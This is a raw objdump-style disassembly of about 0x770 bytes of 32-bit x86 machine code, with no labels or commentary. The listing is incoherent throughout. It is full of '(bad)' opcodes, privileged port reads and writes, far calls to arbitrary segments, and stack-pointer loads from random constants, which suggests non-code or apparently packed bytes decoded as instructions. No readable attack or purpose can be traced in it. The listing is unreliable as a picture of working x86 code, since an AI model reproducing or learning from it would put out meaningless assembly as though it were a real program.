  409c50:	es call 0x7a62:0xe0b00457
  409c58:	pop    ebx
  409c59:	jmp    0x60a9adf9
  409c5e:	sbb    ecx,esi
  409c60:	push   0x9793daa6
  409c65:	xlat   BYTE PTR ds:[ebx]
  409c66:	out    dx,al
  409c67:	mov    DWORD PTR [ecx+0x57d318f4],esi
  409c6d:	mov    eax,ds:0xdb73ae10
  409c72:	outs   dx,BYTE PTR ds:[esi]
  409c73:	mov    ecx,0x88e3b0a0
  409c78:	jecxz  0x409c36
  409c7a:	out    dx,al
  409c7b:	xor    bl,BYTE PTR [esi]
  409c7d:	dec    eax
  409c7e:	mov    dh,0xa1
  409c80:	mov    BYTE PTR [edi],cl
  409c82:	cdq    
  409c83:	ja     0x409c6c
  409c85:	inc    ecx
  409c86:	mov    dl,0x12
  409c88:	mov    eax,0xb5302fa0
  409c8d:	pop    esi
  409c8e:	mov    bl,0x5c
  409c90:	pop    esi
  409c91:	into   
  409c92:	sahf   
  409c93:	call   0x611f:0xf8373cdf
  409c9a:	loop   0x409ca9
  409c9c:	lds    esi,FWORD PTR [ebp-0x15]
  409c9f:	out    0x68,eax
  409ca1:	sbb    eax,0xdcf098e7
  409ca6:	dec    ebp
  409ca7:	ret    0x7a4e
  409caa:	shl    DWORD PTR ds:0x783460ee,0xfd
  409cb1:	out    dx,al
  409cb2:	mov    bh,0xc3
  409cb4:	ja     0x409cc8
  409cb6:	out    dx,al
  409cb7:	jb     0x409d28
  409cb9:	jle    0x409c84
  409cbb:	adc    eax,0xa1226ba9
  409cc0:	mov    ebp,0x7e9e5382
  409cc5:	and    dl,BYTE PTR [esi+0x1cbe5e58]
  409ccb:	pop    ebp
  409ccc:	lea    ecx,[ecx]
  409cce:	jl     0x409d10
  409cd0:	mov    edi,0xf10c9852
  409cd5:	inc    ecx
  409cd6:	out    dx,al
  409cd7:	mov    esp,edi
  409cd9:	cld    
  409cda:	std    
  409cdb:	push   cs
  409cdc:	gs mov ebp,0x6114e035
  409ce2:	sbb    DWORD PTR [esi-0x71a70fc3],esi
  409ce8:	sti    
  409ce9:	(bad)  
  409ceb:	dec    eax
  409cec:	dec    esi
  409ced:	mov    bh,0xb5
  409cef:	adc    eax,0x96887d64
  409cf4:	and    BYTE PTR [eax-0x878e92c],0xd8
  409cfb:	fdiv   DWORD PTR [esi]
  409cfd:	sub    eax,0x3a6e9dee
  409d02:	jl     0x409d6b
  409d04:	sbb    DWORD PTR [edx],ecx
  409d06:	in     eax,dx
  409d07:	and    DWORD PTR [ebx],0xee7f7181
  409d0d:	jbe    0x409d39
  409d0f:	inc    esp
  409d10:	add    esp,DWORD PTR [ecx+0x4a]
  409d13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d14:	inc    esi
  409d15:	sar    DWORD PTR [eax-0x116b96f3],1
  409d1b:	mov    ah,0xdb
  409d1d:	jecxz  0x409cce
  409d1f:	sbb    DWORD PTR [esp+edx*4-0x2f],ebx
  409d23:	test   eax,0x5ee9aebe
  409d28:	add    eax,DWORD PTR [edx]
  409d2a:	push   ebx
  409d2b:	inc    eax
  409d2c:	push   eax
  409d2d:	sbb    al,0xee
  409d2f:	sub    eax,0x7d9a51a3
  409d34:	dec    edi
  409d35:	popa   
  409d36:	popa   
  409d37:	xlat   BYTE PTR ds:[ebx]
  409d38:	inc    eax
  409d39:	jnp    0x409d0b
  409d3b:	clc    
  409d3c:	int    0x40
  409d3e:	in     eax,dx
  409d3f:	jp     0x409dab
  409d41:	in     al,0x41
  409d43:	int    0x9d
  409d45:	jl     0x409d9d
  409d47:	push   cs
  409d48:	or     DWORD PTR [esi+ebx*1+0x3e],ebx
  409d4c:	popa   
  409d4d:	pop    es
  409d4e:	aam    0x20
  409d50:	xchg   ebp,eax
  409d51:	and    BYTE PTR [edx-0xbdd97ba],0x82
  409d58:	mov    ebx,ebp
  409d5a:	out    0xd0,eax
  409d5c:	push   esi
  409d5d:	push   esi
  409d5e:	pop    edi
  409d5f:	inc    edx
  409d60:	imul   esi,DWORD PTR [eax+0x7],0x47348eb7
  409d67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d68:	jo     0x409dcd
  409d6a:	lock es (bad) 
  409d6d:	fimul  WORD PTR [esi-0x71]
  409d70:	das    
  409d71:	push   edi
  409d72:	in     al,dx
  409d73:	jmp    0x409d54
  409d75:	out    dx,eax
  409d76:	ror    BYTE PTR [ebp-0x2131de56],1
  409d7c:	fs and esi,ebp
  409d7f:	pop    esi
  409d80:	pushf  
  409d81:	rcl    DWORD PTR [ebx-0x1d],0xda
  409d85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d86:	pop    ds
  409d87:	jmp    0x409d22
  409d89:	mov    dl,0xbe
  409d8b:	lahf   
  409d8c:	and    edx,DWORD PTR [eax+0x4f]
  409d8f:	pop    DWORD PTR [eax+0x1e2661d3]
  409d95:	ja     0x409d82
  409d97:	aaa    
  409d98:	je     0x409d5e
  409d9a:	and    BYTE PTR [esi-0x6e],al
  409d9d:	pusha  
  409d9e:	lods   eax,DWORD PTR ds:[esi]
  409d9f:	icebp  
  409da0:	call   0xbc53:0x177c1ee4
  409da7:	or     al,BYTE PTR [ecx]
  409da9:	in     al,0x4e
  409dab:	xchg   ebp,eax
  409dac:	iret   
  409dad:	cdq    
  409dae:	or     bl,BYTE PTR [eax]
  409db0:	pop    esi
  409db1:	pusha  
  409db2:	mov    esi,0xc4bfff0c
  409db7:	and    esi,DWORD PTR [edx+0xf]
  409dba:	jne    0x409e24
  409dbc:	jle    0x409e0f
  409dbe:	in     eax,0xa0
  409dc0:	xchg   ebx,eax
  409dc1:	and    bl,BYTE PTR [eax+0x602c0f9b]
  409dc7:	jl     0x409d67
  409dc9:	int3   
  409dca:	rcr    BYTE PTR [ebx-0x5bda4aa0],1
  409dd0:	or     DWORD PTR [esi+0x275884c2],ecx
  409dd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dd7:	xchg   ecx,eax
  409dd8:	jnp    0x409d9d
  409dda:	out    dx,al
  409ddb:	add    ebx,DWORD PTR [edi-0x3fce1c7]
  409de1:	retf   
  409de2:	pop    ss
  409de3:	mov    eax,ds:0x382a44ca
  409de8:	fwait
  409de9:	sub    DWORD PTR [ebx+0x13],ebx
  409dec:	pop    ebp
  409ded:	jnp    0x409e46
  409def:	jns    0x409d7e
  409df1:	rcl    BYTE PTR [ebx+0x49],cl
  409df4:	popf   
  409df5:	mov    cl,0x32
  409df7:	cmc    
  409df8:	mov    bl,0x67
  409dfa:	dec    ecx
  409dfb:	mov    esp,0x330024de
  409e00:	test   al,0xde
  409e02:	arpl   di,di
  409e04:	pop    esi
  409e05:	(bad)  
  409e06:	loope  0x409d90
  409e08:	mov    ebp,0x82e784e8
  409e0d:	pusha  
  409e0e:	stc    
  409e0f:	adc    al,0x98
  409e11:	adc    dl,BYTE PTR [edx]
  409e13:	fsub   DWORD PTR [esi]
  409e15:	jno    0x409e05
  409e17:	push   ss
  409e18:	je     0x409e29
  409e1a:	fisubr DWORD PTR [ebp-0x5c323698]
  409e20:	sbb    eax,0x653c514c
  409e25:	xchg   ecx,eax
  409e26:	xchg   esi,eax
  409e27:	xchg   ebx,eax
  409e28:	jg     0x409e54
  409e2a:	out    dx,al
  409e2b:	lahf   
  409e2c:	dec    ebp
  409e2d:	outs   dx,BYTE PTR ds:[esi]
  409e2e:	shl    BYTE PTR [edi+0x2b],1
  409e31:	call   0x2e063e17
  409e36:	je     0x409dcd
  409e38:	push   ds
  409e39:	pop    es
  409e3a:	and    esp,edi
  409e3c:	out    0xe3,eax
  409e3e:	out    dx,al
  409e3f:	dec    ebp
  409e40:	pop    ebx
  409e41:	dec    eax
  409e42:	push   edi
  409e43:	and    al,0x86
  409e45:	retf   
  409e46:	or     BYTE PTR [ecx+0x250e15a0],ah
  409e4c:	cwde   
  409e4d:	cmp    BYTE PTR [eax-0x1836a1bd],ch
  409e53:	retf   
  409e54:	shr    ebx,0xb
  409e57:	std    
  409e58:	ret    
  409e59:	pusha  
  409e5a:	pop    ebx
  409e5b:	pop    es
  409e5c:	sub    al,bh
  409e5e:	xlat   BYTE PTR cs:[ebx]
  409e60:	inc    ebx
  409e61:	and    eax,0x7b5e54de
  409e66:	popf   
  409e67:	sbb    dh,al
  409e69:	pop    ebx
  409e6a:	out    0x55,eax
  409e6c:	cs popa 
  409e6e:	cmp    DWORD PTR [edi],0xe93cc4ed
  409e74:	cmc    
  409e75:	fldpi  
  409e77:	and    dl,dh
  409e79:	test   cl,0xd2
  409e7c:	daa    
  409e7d:	icebp  
  409e7e:	xchg   edx,eax
  409e7f:	sub    DWORD PTR [eax*2+0x28fd922c],edx
  409e86:	out    dx,al
  409e87:	xor    al,0xda
  409e89:	or     esp,ecx
  409e8b:	loop   0x409efa
  409e8d:	pop    eax
  409e8e:	out    dx,al
  409e8f:	mov    al,0x98
  409e91:	ret    0x8c59
  409e94:	ror    DWORD PTR [edi-0x37ff5ef0],1
  409e9a:	ins    DWORD PTR es:[edi],dx
  409e9b:	inc    eax
  409e9c:	shl    dh,0xf
  409e9f:	mul    DWORD PTR [ecx+esi*1-0x5e]
  409ea3:	push   es
  409ea4:	repz add DWORD PTR [esi],ebp
  409ea7:	mov    dh,0x7b
  409ea9:	sbb    BYTE PTR [ecx],bh
  409eab:	int3   
  409eac:	fisub  WORD PTR [eax-0x13]
  409eaf:	xchg   ebx,eax
  409eb0:	ds mov dl,0x37
  409eb3:	sub    dh,BYTE PTR [edi]
  409eb5:	inc    eax
  409eb6:	in     eax,0x70
  409eb8:	pop    esi
  409eb9:	mov    ecx,0x9b9ace4c
  409ebe:	mov    ch,0x58
  409ec0:	sub    ax,WORD PTR ds:0xab52ba2
  409ec7:	iret   
  409ec8:	pop    ebx
  409ec9:	jb     0x409f43
  409ecb:	push   ebp
  409ecc:	inc    ebp
  409ecd:	add    eax,0x811031ee
  409ed2:	cli    
  409ed3:	jp     0x409e96
  409ed5:	push   esp
  409ed6:	cdq    
  409ed7:	mov    ds:0xe01dddbf,al
  409edc:	addr16 mov bl,0x7c
  409edf:	adc    BYTE PTR [eax],al
  409ee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ee2:	jne    0x409f2e
  409ee4:	or     DWORD PTR [ecx+0x3f],esp
  409ee7:	(bad)  
  409ee9:	cwde   
  409eea:	dec    BYTE PTR [esi+0x21b19052]
  409ef0:	cmp    al,0x43
  409ef2:	or     dh,cl
  409ef4:	mov    ebx,0x5e9639b0
  409ef9:	dec    ecx
  409efa:	sbb    eax,0xc996d54d
  409eff:	xchg   esp,eax
  409f00:	pop    ebx
  409f01:	leave  
  409f02:	and    BYTE PTR [ecx-0x7ba7d4b2],0x57
  409f09:	mov    ah,0xfc
  409f0b:	adc    bl,BYTE PTR [esi+0x6f]
  409f0e:	icebp  
  409f0f:	and    al,BYTE PTR [ebx-0x4bc007bc]
  409f15:	pop    ebp
  409f16:	mov    ds:0x1740254d,eax
  409f1b:	les    ebx,FWORD PTR [esi+0x5e012b86]
  409f21:	(bad)  
  409f22:	mov    fs,WORD PTR [ebx+0x182df575]
  409f28:	xchg   ebp,eax
  409f29:	push   ecx
  409f2a:	imul   ebp,DWORD PTR [esi-0x62f15989],0x47
  409f31:	pop    esp
  409f32:	mov    eax,ds:0x100f720
  409f37:	jo     0x409fab
  409f39:	cli    
  409f3a:	pop    edi
  409f3b:	and    DWORD PTR [eax+0x41],esi
  409f3e:	dec    esp
  409f3f:	bound  edi,QWORD PTR [eax]
  409f41:	cmp    bh,BYTE PTR [ebx+0x11]
  409f44:	(bad)  
  409f45:	and    al,0x42
  409f47:	mov    eax,ds:0x595221db
  409f4c:	out    dx,eax
  409f4d:	or     BYTE PTR [ebp-0x5a],bh
  409f50:	pop    esi
  409f51:	sub    eax,0x1706763e
  409f56:	ffree  st(0)
  409f58:	enter  0xae60,0xe3
  409f5c:	fisubr WORD PTR [edi-0x65e3c797]
  409f62:	es jg  0x409fad
  409f65:	popa   
  409f66:	push   ecx
  409f67:	push   ss
  409f68:	int    0xf3
  409f6a:	fsubr  QWORD PTR [edi]
  409f6c:	shl    BYTE PTR [esp+eax*1-0x5d238058],0x77
  409f74:	pop    es
  409f75:	jno    0x409fcc
  409f77:	jle    0x409f01
  409f79:	arpl   WORD PTR [edi+0x1],dx
  409f7c:	dec    esp
  409f7d:	shl    al,1
  409f7f:	sbb    al,ah
  409f81:	xchg   edx,eax
  409f82:	stos   DWORD PTR es:[edi],eax
  409f83:	pusha  
  409f84:	push   ecx
  409f85:	pop    ebx
  409f86:	dec    ebp
  409f87:	stos   BYTE PTR es:[edi],al
  409f88:	push   esp
  409f89:	push   esi
  409f8a:	mov    bh,0x87
  409f8c:	xor    BYTE PTR [ecx-0x7d731b93],bl
  409f92:	inc    BYTE PTR [eax]
  409f94:	mov    ebp,0x8221f02b
  409f99:	mov    al,0xb
  409f9b:	popa   
  409f9c:	jo     0x409f4a
  409f9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f9f:	push   eax
  409fa0:	scas   eax,DWORD PTR es:[edi]
  409fa1:	pop    edi
  409fa2:	or     al,0xb6
  409fa4:	xor    BYTE PTR [ebx],0xdf
  409fa7:	xchg   BYTE PTR [edi-0x71],ch
  409faa:	add    DWORD PTR [ebp-0x69],ebx
  409fad:	sub    dh,ch
  409faf:	jo     0x409f83
  409fb1:	or     eax,0xaefb4085
  409fb6:	and    ah,BYTE PTR [ecx+0x5692243f]
  409fbc:	xchg   edx,eax
  409fbd:	jno    0x409fb4
  409fbf:	dec    ecx
  409fc0:	pop    esi
  409fc1:	sub    dh,BYTE PTR [edi+0x42]
  409fc4:	hlt    
  409fc5:	scas   eax,DWORD PTR es:[edi]
  409fc6:	mov    eax,0x3f5df3cc
  409fcb:	mov    ds:0xca82032,al
  409fd0:	mov    esi,0x5e1f9778
  409fd5:	push   ds
  409fd6:	aam    0xc7
  409fd8:	jae    0x409fe6
  409fda:	inc    edi
  409fdb:	in     eax,0x11
  409fdd:	inc    ebx
  409fde:	cs jmp 0xa37e:0xe2eae0c1
  409fe6:	or     bl,BYTE PTR [esi-0x547daaa3]
  409fec:	iret   
  409fed:	pop    esi
  409fee:	pop    ecx
  409fef:	loop   0x409f86
  409ff1:	dec    dh
  409ff3:	lahf   
  409ff4:	stos   BYTE PTR es:[edi],al
  409ff5:	pop    edi
  409ff6:	ja     0x40a03e
  409ff8:	outs   dx,DWORD PTR ds:[esi]
  409ff9:	imul   esi,DWORD PTR [edx],0x68
  409ffc:	add    al,0x70
  409ffe:	xor    al,0x7d
  40a000:	out    dx,eax
  40a001:	inc    edx
  40a002:	in     eax,dx
  40a003:	in     eax,dx
  40a004:	xchg   ecx,eax
  40a005:	dec    esi
  40a006:	sub    cl,ch
  40a008:	adc    ecx,ebp
  40a00a:	push   cs
  40a00b:	call   0xe3c2a084
  40a010:	loope  0x40a064
  40a012:	push   0xffffff89
  40a014:	in     eax,0x89
  40a016:	push   cs
  40a017:	fidivr WORD PTR [eax+0x5e073e72]
  40a01d:	sahf   
  40a01e:	push   esp
  40a01f:	push   ebp
  40a020:	call   0xa6b14b57
  40a025:	pop    ebp
  40a026:	int3   
  40a027:	out    0xc8,eax
  40a029:	imul   esp,ebp,0x2f
  40a02c:	lock xor ch,dh
  40a02f:	ret    
  40a030:	pop    eax
  40a031:	or     eax,0xef1b0f1
  40a036:	mov    ecx,0x3461818c
  40a03b:	loope  0x40a093
  40a03d:	xlat   BYTE PTR ds:[ebx]
  40a03e:	add    DWORD PTR [ecx-0x3e],ebp
  40a041:	mov    esi,ebp
  40a043:	sbb    DWORD PTR [si-0x178],ebx
  40a048:	sub    al,BYTE PTR [ebp+0x10]
  40a04b:	mov    eax,ds:0xd2687c11
  40a050:	jg     0x40a0c1
  40a052:	in     al,dx
  40a053:	call   0x35f704b7
  40a058:	adc    BYTE PTR [ebp-0x3f1fa421],ah
  40a05e:	xchg   edx,eax
  40a05f:	stos   BYTE PTR es:[edi],al
  40a060:	inc    ebp
  40a061:	popa   
  40a062:	pop    es
  40a063:	sbb    al,0xe9
  40a065:	jne    0x40a07e
  40a067:	cs mov ebp,0x9458eec6
  40a06d:	add    BYTE PTR [esi],dh
  40a06f:	and    DWORD PTR [ecx-0x1e1712d0],ebx
  40a075:	pusha  
  40a076:	data16 jns 0x40a0e6
  40a079:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a07a:	(bad)  
  40a07b:	call   0xcc2ec63f
  40a080:	outs   dx,DWORD PTR ds:[esi]
  40a081:	xchg   esp,eax
  40a082:	sbb    esp,DWORD PTR [edi-0x583f947f]
  40a088:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a089:	cli    
  40a08a:	push   esi
  40a08b:	fwait
  40a08c:	push   esp
  40a08d:	addr16 jl 0x40a034
  40a090:	cmc    
  40a091:	fsub   DWORD PTR [ebx]
  40a093:	lods   eax,DWORD PTR ds:[esi]
  40a094:	xchg   BYTE PTR [edi+0x6972afe8],ch
  40a09a:	pop    esp
  40a09b:	inc    ebp
  40a09c:	pop    esi
  40a09d:	dec    ebx
  40a09e:	mov    esp,0xc822db1a
  40a0a3:	sbb    edi,DWORD PTR [esi-0x42]
  40a0a6:	jns    0x40a0b9
  40a0a8:	mov    dl,0x60
  40a0aa:	mov    bl,0x66
  40a0ac:	xchg   esi,eax
  40a0ad:	mov    DWORD PTR [ebp-0x117d17d0],ebx
  40a0b3:	sub    dl,BYTE PTR [ebx+0x40a6762e]
  40a0b9:	fdivp  st(2),st
  40a0bb:	mov    al,ds:0xb35dac05
  40a0c0:	mov    dh,0x28
  40a0c2:	push   es
  40a0c3:	pop    ds
  40a0c4:	pop    esi
  40a0c5:	mov    bl,0x72
  40a0c7:	shr    DWORD PTR [edi-0x78],0x5e
  40a0cb:	adc    BYTE PTR [ecx],0x61
  40a0ce:	scas   eax,DWORD PTR es:[edi]
  40a0cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0d0:	xor    bh,BYTE PTR [ecx+0x15e1911c]
  40a0d6:	out    dx,al
  40a0d7:	jnp    0x40a0db
  40a0d9:	(bad)  [edi-0x39]
  40a0dc:	pusha  
  40a0dd:	jp     0x40a071
  40a0df:	mov    eax,ds:0xb803b843
  40a0e4:	in     al,dx
  40a0e5:	dec    edx
  40a0e6:	push   ds
  40a0e7:	sub    eax,0x4c185a5e
  40a0ec:	popw   ss
  40a0ee:	lea    edi,[edi]
  40a0f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0f1:	pop    ecx
  40a0f2:	call   0x21c1:0xa4f9fa36
  40a0f9:	xor    eax,0xd95ead93
  40a0fe:	test   eax,0x14129af7
  40a103:	(bad)  
  40a104:	fisub  DWORD PTR [eax-0x35]
  40a107:	jl     0x40a184
  40a109:	call   0x54ee:0x61d9430
  40a110:	xor    ebx,ebp
  40a112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a113:	aaa    
  40a114:	adc    esp,DWORD PTR [edi]
  40a116:	loop   0x40a0b8
  40a118:	inc    ecx
  40a119:	sar    DWORD PTR [edi+edx*8+0x61],0x6b
  40a11e:	jne    0x40a0ef
  40a120:	into   
  40a121:	(bad)  
  40a122:	out    dx,al
  40a123:	jl     0x40a141
  40a125:	xor    bh,BYTE PTR [ebp+0x218d945b]
  40a12b:	mov    eax,ds:0x2968fab7
  40a130:	cdq    
  40a131:	xchg   edi,eax
  40a133:	adc    dh,ch
  40a135:	fucomip st,st(6)
  40a137:	cmp    BYTE PTR [edi+eiz*2-0x46],ch
  40a13b:	call   0xa099a641
  40a140:	xchg   ecx,eax
  40a141:	scas   al,BYTE PTR es:[edi]
  40a142:	in     al,dx
  40a143:	repnz stc 
  40a145:	dec    ebx
  40a146:	and    al,BYTE PTR ds:[edi-0xd4ec5d5]
  40a14d:	mov    dh,ch
  40a14f:	sahf   
  40a150:	imul   ebp,DWORD PTR [edi+ebx*2+0x2d],0x2
  40a155:	pop    esi
  40a156:	in     al,0xa0
  40a158:	sbb    al,0x9c
  40a15a:	sub    ebx,DWORD PTR [esi]
  40a15c:	xchg   ebp,eax
  40a15d:	(bad)  
  40a15e:	and    al,0xae
  40a160:	pop    ebp
  40a161:	inc    ebx
  40a162:	sahf   
  40a163:	test   al,0x4d
  40a165:	push   ecx
  40a166:	push   ebp
  40a167:	fbstp  TBYTE PTR [edx-0x1a]
  40a16a:	js     0x40a10d
  40a16c:	bound  edx,QWORD PTR [ecx-0x692d23ca]
  40a172:	and    esp,esp
  40a174:	push   ebx
  40a175:	(bad)  
  40a176:	xlat   BYTE PTR ds:[ebx]
  40a177:	(bad)  
  40a178:	fiadd  WORD PTR [edi-0x1bd013bc]
  40a17e:	stc    
  40a17f:	repnz popaw 
  40a182:	outs   dx,DWORD PTR ds:[esi]
  40a183:	xor    esi,DWORD PTR [ebx]
  40a185:	mov    WORD PTR [eax+eax*4-0x57],ds
  40a189:	pop    es
  40a18a:	out    dx,al
  40a18b:	loopne 0x40a1e1
  40a18d:	xchg   BYTE PTR [esi-0x4b],dh
  40a190:	add    ch,BYTE PTR [edi]
  40a192:	sbb    BYTE PTR [eax-0x5e3298c4],0x10
  40a199:	(bad)  
  40a19a:	sbb    dl,bl
  40a19c:	jnp    0x40a1ce
  40a19e:	xor    BYTE PTR [esi+ebx*2-0xc],cl
  40a1a2:	xor    eax,0x39817a91
  40a1a7:	ret    0x424b
  40a1aa:	xchg   ebx,eax
  40a1ab:	pusha  
  40a1ac:	push   es
  40a1ad:	cwde   
  40a1ae:	cli    
  40a1af:	inc    esp
  40a1b0:	fdivrp st(5),st
  40a1b2:	scas   al,BYTE PTR es:[edi]
  40a1b3:	in     eax,dx
  40a1b4:	out    0xe7,eax
  40a1b6:	out    dx,al
  40a1b7:	mov    ds:0xb7e3b012,eax
  40a1bc:	and    dl,ch
  40a1be:	test   eax,0x9678aba0
  40a1c3:	xor    eax,ecx
  40a1c5:	loopne 0x40a245
  40a1c7:	arpl   WORD PTR [esi+0x44],bx
  40a1ca:	sbb    al,0xa0
  40a1cc:	jp     0x40a1da
  40a1ce:	cmp    ah,BYTE PTR [edi+ebp*8+0x59abf24a]
  40a1d5:	popa   
  40a1d6:	add    BYTE PTR [eax-0x2f],ah
  40a1d9:	sbb    al,BYTE PTR [esi-0x3e]
  40a1dc:	pop    esi
  40a1dd:	or     al,0x9c
  40a1df:	cs stos BYTE PTR es:[edi],al
  40a1e1:	lock outs dx,BYTE PTR ds:[esi]
  40a1e3:	fld    QWORD PTR [ecx+eiz*2]
  40a1e6:	ds enter 0x2650,0xb1
  40a1eb:	add    ebx,DWORD PTR [eax+0x3965fc24]
  40a1f1:	sub    dh,0x3d
  40a1f4:	(bad)  
  40a1f6:	mov    ecx,0xeee42fa2
  40a1fb:	adc    BYTE PTR [edi],dh
  40a1fd:	rol    BYTE PTR [edx],0xc3
  40a200:	out    dx,eax
  40a201:	add    bh,ch
  40a203:	add    dh,BYTE PTR [ebp+0x5b]
  40a206:	retf   
  40a207:	adc    BYTE PTR ds:0x81ee948a,bh
  40a20d:	pusha  
  40a20e:	shl    BYTE PTR [edx],0x79
  40a211:	rcl    BYTE PTR [ebp-0x57],0x1b
  40a215:	in     al,0xee
  40a217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a218:	call   0x2bf:0x340a915c
  40a21f:	mov    eax,ds:0x14cf0e2e
  40a224:	jmp    0x5eaa8b8f
  40a229:	dec    eax
  40a22a:	pop    esp
  40a22b:	int3   
  40a22c:	hlt    
  40a22d:	ss xchg edx,eax
  40a22f:	loope  0x40a1f6
  40a231:	pusha  
  40a232:	and    DWORD PTR [eax+0x3f],0xfe10f5aa
  40a239:	inc    dh
  40a23b:	(bad)  
  40a23c:	mov    ds,WORD PTR [ebx-0x30]
  40a23f:	ins    DWORD PTR es:[edi],dx
  40a240:	test   DWORD PTR [edi],0xdc84f62e
  40a246:	ret    
  40a247:	mov    al,ds:0xe25cd628
  40a24c:	sar    esi,1
  40a24e:	loope  0x40a20e
  40a250:	pop    esi
  40a251:	mov    ds:0xdde22dcd,al
  40a256:	jg     0x40a2ce
  40a258:	daa    
  40a259:	popa   
  40a25a:	adc    eax,0x8624fa15
  40a25f:	daa    
  40a260:	ret    
  40a261:	popa   
  40a262:	pop    esi
  40a263:	repz xor al,0x57
  40a266:	icebp  
  40a267:	mov    al,ds:0x4530e88e
  40a26c:	or     cl,BYTE PTR [edi+0x12]
  40a26f:	(bad)  [edi+edx*4+0x269c2dee]
  40a276:	bound  esi,QWORD PTR [ebx-0x58]
  40a279:	shr    dh,0xba
  40a27c:	jns    0x40a26e
  40a27e:	in     al,dx
  40a27f:	mov    ds:0x9ebd242c,eax
  40a284:	pop    edx
  40a285:	mov    DWORD PTR [eax-0x64],esp
  40a288:	jle    0x40a260
  40a28a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a28b:	int3   
  40a28c:	enter  0xeeb4,0xf0
  40a290:	jb     0x40a281
  40a292:	xchg   edi,eax
  40a293:	ds push 0xffffff87
  40a296:	outs   dx,DWORD PTR ds:[esi]
  40a297:	mov    eax,ds:0x2f653b2d
  40a29c:	call   edx
  40a29e:	push   ds
  40a29f:	adc    bl,BYTE PTR [esi+0x5d]
  40a2a2:	cmp    eax,DWORD PTR [eax+0x3cb1f1fb]
  40a2a8:	pop    ecx
  40a2a9:	popa   
  40a2aa:	es mov bh,0xa0
  40a2ad:	jge    0x40a270
  40a2af:	inc    edx
  40a2b0:	adc    BYTE PTR [ecx-0x13],bh
  40a2b3:	pop    ds
  40a2b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2b5:	out    0x50,al
  40a2b7:	out    dx,eax
  40a2b8:	out    0x7e,al
  40a2ba:	push   esi
  40a2bb:	adc    al,0x99
  40a2bd:	stos   BYTE PTR es:[edi],al
  40a2be:	jne    0x40a261
  40a2c0:	adc    DWORD PTR [ecx],0x68618cb9
  40a2c6:	pop    ds
  40a2c7:	arpl   WORD PTR [ebx],si
  40a2c9:	xchg   edx,eax
  40a2ca:	or     DWORD PTR [ecx],esp
  40a2cc:	test   eax,0xda493b22
  40a2d1:	sub    al,0x3a
  40a2d3:	mov    al,ds:0x8719041
  40a2d8:	shl    BYTE PTR [eax+0x49],cl
  40a2db:	xor    al,0x18
  40a2dd:	mov    dl,0x1e
  40a2df:	pop    esp
  40a2e0:	adc    al,dh
  40a2e2:	jno    0x40a285
  40a2e4:	ror    esi,cl
  40a2e6:	mov    esp,0x238e99f2
  40a2eb:	mov    eax,ds:0x36ad1a6b
  40a2f0:	mov    esp,0x3ca34181
  40a2f5:	loope  0x40a372
  40a2f7:	aam    0x67
  40a2f9:	pusha  
  40a2fa:	pop    ds
  40a2fb:	mov    eax,ds:0x90ab4c33
  40a300:	ins    DWORD PTR es:[edi],dx
  40a301:	pusha  
  40a302:	iret   
  40a303:	sbb    DWORD PTR ds:0x775ff62b,0x77
  40a30a:	hlt    
  40a30b:	cld    
  40a30c:	popf   
  40a30d:	cld    
  40a30e:	xchg   esp,eax
  40a30f:	imul   ebx,DWORD PTR [esi+0x25],0xa4aa95ed
  40a316:	(bad)  
  40a317:	jae    0x40a36d
  40a319:	mov    edi,0xa815a113
  40a31e:	jmp    0x5e01:0x47a2fc75
  40a325:	inc    eax
  40a326:	fidivr WORD PTR [ecx+0x11b6347a]
  40a32c:	push   ebx
  40a32d:	popa   
  40a32e:	fst    st(4)
  40a330:	push   ebp
  40a331:	jno    0x40a3ad
  40a333:	push   esi
  40a334:	addr16 fucomp st(6)
  40a337:	lds    esi,FWORD PTR [edx+0x14552f0]
  40a33d:	mov    es:0x99924ba1,eax
  40a343:	mov    fs,esi
  40a345:	je     0x40a311
  40a347:	jb     0x40a3a7
  40a349:	out    dx,eax
  40a34a:	shl    BYTE PTR [ebp+0x7c3d7d79],1
  40a350:	fucomip st,st(0)
  40a352:	pop    eax
  40a353:	call   0xf55d:0x1c740898
  40a35a:	mov    cl,0xa1
  40a35c:	dec    ebp
  40a35d:	cdq    
  40a35e:	mov    esi,0x1ac35d69
  40a363:	mov    edx,fs
  40a365:	cmp    bh,cl
  40a367:	fwait
  40a368:	mov    ah,BYTE PTR [edx+0x3464a16e]
  40a36e:	push   es
  40a36f:	push   ebx
  40a370:	cmp    cl,BYTE PTR [ecx]
  40a372:	ret    
  40a373:	jl     0x40a39b
  40a375:	sahf   
  40a376:	lods   eax,DWORD PTR ds:[esi]
  40a377:	sahf   
  40a378:	inc    ecx
  40a379:	retf   
  40a37a:	add    DWORD PTR fs:[ebx+0x7e],ecx
  40a37e:	sbb    al,0xd6
  40a380:	pushf  
  40a381:	push   ecx
  40a382:	mov    cl,0xaa
  40a384:	dec    ebp
  40a385:	jno    0x40a3b5
  40a387:	adc    BYTE PTR [ebx+0x5e615bf6],ah
  40a38d:	ja     0x40a366
  40a38f:	ficom  DWORD PTR [eax+eiz*1+0x66]
  40a393:	jle    0x40a34c
  40a395:	pop    edi
  40a396:	mov    eax,0x9a2f373c
  40a39b:	mov    bl,0x66
  40a39d:	jno    0x40a35f
  40a39f:	cmp    dl,BYTE PTR [ebx+0x11]
  40a3a2:	adc    ch,dl
  40a3a4:	fisubr WORD PTR [esi+0x476c3fc0]
  40a3aa:	add    DWORD PTR [ebx+edi*2+0x1bd400ca],esp
  40a3b1:	or     DWORD PTR [esi+0x50],ebp
  40a3b4:	xor    eax,0x363c7ed0
  40a3b9:	inc    ebp
  40a3ba:	xchg   DWORD PTR [ecx+0x3030cc50],esp
  40a3c0:	lock loop 0x40a3a4
  40a3c3:	cdq    
  40a3c4:	hlt    
